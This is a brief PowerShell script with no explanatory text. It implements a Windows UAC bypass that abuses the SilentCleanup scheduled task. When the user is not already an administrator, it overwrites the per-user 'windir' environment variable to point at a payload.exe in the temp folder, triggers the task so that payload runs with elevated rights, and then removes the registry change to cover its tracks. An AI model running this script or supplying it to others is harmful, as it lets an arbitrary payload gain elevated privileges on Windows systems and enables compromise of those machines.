if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
  powershell.exe;
} else {
  $registryPath = "HKCU:\Environment";
  $Name = "windir";
  $Value=-join('"', $env:TMP,"\payload.exe", '"');
  Set-ItemProperty -Path $registryPath -Name $name -Value $Value;
  schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null;
  Remove-ItemProperty -Path $registryPath -Name $name;
}
